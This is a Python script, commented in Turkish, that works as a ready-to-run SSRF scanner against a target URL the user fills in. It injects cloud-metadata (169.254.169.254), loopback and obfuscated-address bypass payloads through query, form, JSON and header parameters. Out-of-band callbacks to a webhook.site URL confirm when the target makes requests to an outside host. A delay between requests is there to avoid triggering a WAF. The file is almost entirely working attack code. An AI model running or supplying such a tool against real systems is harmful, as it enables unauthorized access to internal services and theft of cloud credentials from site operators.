#!/usr/bin/env python3
# Dependencies: requests

import json
import time
from dataclasses import dataclass
from typing import Dict, List, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import requests

# Hedef ayarları
TARGET_URL = "[BURAYA URL'I YAZACAKSIN]"
OOB_SERVER = "https://webhook.site/03c8927b-b89d-420a-8697-0739907d0ea9"

# WAF tetikleme olasılığını azaltmak için istekler arası gecikme (saniye)
REQUEST_DELAY = 0.2
REQUEST_TIMEOUT = 8

# Gizli/ek SSRF parametreleri
HIDDEN_SSRF_PARAMS = [
    "url",
    "callback",
    "api",
    "proxy",
    "dest",
    "redirect",
    "uri",
    "path",
    "feed",
    "src",
    "file",
    "document",
    "folder",
    "root",
]

# Header tabanlı SSRF denemeleri için hedef başlıklar
HEADER_CANDIDATES = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "Referer",
    "Custom-Proxy",
]


@dataclass
class AttemptResult:
    """Her isteğin özet sonucunu tutar."""

    vector: str
    method: str
    param: str
    payload: str
    status: str
    detail: str


def parse_url_params(url: str) -> Dict[str, str]:
    """Verilen URL içindeki query parametrelerini ayıklar."""

    parsed = urlparse(url)
    return dict(parse_qsl(parsed.query, keep_blank_values=True))


def build_oob_payload(param_name: str, method_tag: str) -> str:
    """Webhook tarafında yöntemi görebilmek için etiketli OOB payload üretir."""

    return f"{OOB_SERVER}/{param_name}?method={method_tag}"


def build_payload_matrix(param_name: str, method_tag: str) -> List[str]:
    """OOB, internal probe ve bypass payload listesini döndürür."""

    oob = build_oob_payload(param_name, method_tag)
    return [
        oob,
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/",
        "http://0x7f000001/",
        "http://2130706433/",
        "http://127.1/",
        "http://0177.0000.0000.0001/",
        "http://127。0。0。1/",
        "http://[0:0:0:0:0:ffff:7f00:1]/",
        "http://127.0.0.1.nip.io/",
        "http://169.254.169.254.nip.io/latest/meta-data/",
    ]


def build_request_url(base_url: str, params: Dict[str, str]) -> str:
    """Parametre sözlüğünü URL query kısmına yazar."""

    parsed = urlparse(base_url)
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def make_session() -> requests.Session:
    """Minimal ama gerçekçi header'larla bir HTTP oturumu hazırlar."""

    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (compatible; DeepSSRFProbe/1.0)",
            "Accept": "*/*",
            "Connection": "close",
        }
    )
    return session


def send_request(
    session: requests.Session,
    method: str,
    url: str,
    headers: Dict[str, str],
    data: Dict[str, str] = None,
    json_data: Dict[str, str] = None,
) -> Tuple[str, str]:
    """Tek bir HTTP isteği gönderir ve durum/ayrıntı döndürür."""

    try:
        response = session.request(
            method=method,
            url=url,
            headers=headers,
            data=data,
            json=json_data,
            timeout=REQUEST_TIMEOUT,
            allow_redirects=False,
        )
        return str(response.status_code), f"len={len(response.text)}"
    except requests.Timeout:
        return "TIMEOUT", "request timed out"
    except requests.RequestException as exc:
        return "ERROR", str(exc)


def classify_result(status: str, baseline_status: str) -> str:
    """Başarılı veya şüpheli sonucu sınıflandırır."""

    if status in {"200", "201", "202", "204", "301", "302", "307", "308"}:
        return "SUCCESS"
    if status == "TIMEOUT":
        return "SUSPICIOUS"
    if baseline_status and status != baseline_status:
        return "SUSPICIOUS"
    return "INFO"


def log_result(result: AttemptResult) -> None:
    """Detaylı sonuç satırını terminale basar."""

    print(
        f"[{result.status}] vector={result.vector} method={result.method} "
        f"param={result.param} payload={result.payload} detail={result.detail}"
    )


def run_deep_ssrf_scan(target_url: str) -> None:
    """Tek hedef URL üzerinde deep-dive SSRF testlerini çalıştırır."""

    session = make_session()

    # URL'de var olan parametreleri çıkar
    existing_params = parse_url_params(target_url)

    # Gizli fuzz parametrelerini mevcut parametrelerle birleştir
    all_params = list(dict.fromkeys(list(existing_params.keys()) + HIDDEN_SSRF_PARAMS))

    # Baseline durum kodları: kıyas için başlangıç ölçümü
    baseline_get_status, _ = send_request(session, "GET", target_url, headers={})
    baseline_post_form_status, _ = send_request(
        session,
        "POST",
        target_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=existing_params,
    )
    baseline_post_json_status, _ = send_request(
        session,
        "POST",
        target_url,
        headers={"Content-Type": "application/json"},
        json_data=existing_params,
    )

    for param in all_params:
        # GET parametre enjeksiyonları
        for payload in build_payload_matrix(param, "GET_QUERY"):
            params = dict(existing_params)
            params[param] = payload
            test_url = build_request_url(target_url, params)
            status, detail = send_request(session, "GET", test_url, headers={})
            label = classify_result(status, baseline_get_status)
            if label in {"SUCCESS", "SUSPICIOUS"}:
                log_result(AttemptResult("QUERY", "GET", param, payload, label, f"status={status} {detail}"))
            time.sleep(REQUEST_DELAY)

        # POST form-data parametre enjeksiyonları
        for payload in build_payload_matrix(param, "POST_FORM"):
            form_data = dict(existing_params)
            form_data[param] = payload
            status, detail = send_request(
                session,
                "POST",
                target_url,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data=form_data,
            )
            label = classify_result(status, baseline_post_form_status)
            if label in {"SUCCESS", "SUSPICIOUS"}:
                log_result(
                    AttemptResult(
                        "BODY_FORM",
                        "POST",
                        param,
                        payload,
                        label,
                        f"status={status} {detail}",
                    )
                )
            time.sleep(REQUEST_DELAY)

        # POST raw JSON parametre enjeksiyonları
        for payload in build_payload_matrix(param, "POST_JSON"):
            json_data = dict(existing_params)
            json_data[param] = payload
            status, detail = send_request(
                session,
                "POST",
                target_url,
                headers={"Content-Type": "application/json"},
                json_data=json_data,
            )
            label = classify_result(status, baseline_post_json_status)
            if label in {"SUCCESS", "SUSPICIOUS"}:
                log_result(
                    AttemptResult(
                        "BODY_JSON",
                        "POST",
                        param,
                        payload,
                        label,
                        f"status={status} {detail}",
                    )
                )
            time.sleep(REQUEST_DELAY)

        # Header enjeksiyonları
        for header_name in HEADER_CANDIDATES:
            header_payload = build_oob_payload(param, f"HEADER_{header_name.replace('-', '_')}")
            status, detail = send_request(
                session,
                "GET",
                target_url,
                headers={header_name: header_payload},
            )
            label = classify_result(status, baseline_get_status)
            if label in {"SUCCESS", "SUSPICIOUS"}:
                log_result(
                    AttemptResult(
                        "HEADER",
                        "GET",
                        header_name,
                        header_payload,
                        label,
                        f"status={status} {detail}",
                    )
                )
            time.sleep(REQUEST_DELAY)


if __name__ == "__main__":
    if TARGET_URL.startswith("["):
        raise SystemExit("TARGET_URL değerini gerçek bir URL ile güncelle.")

    print("[*] Deep-dive SSRF scan started")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] OOB: {OOB_SERVER}")
    run_deep_ssrf_scan(TARGET_URL)
    print("[*] Deep-dive SSRF scan finished")
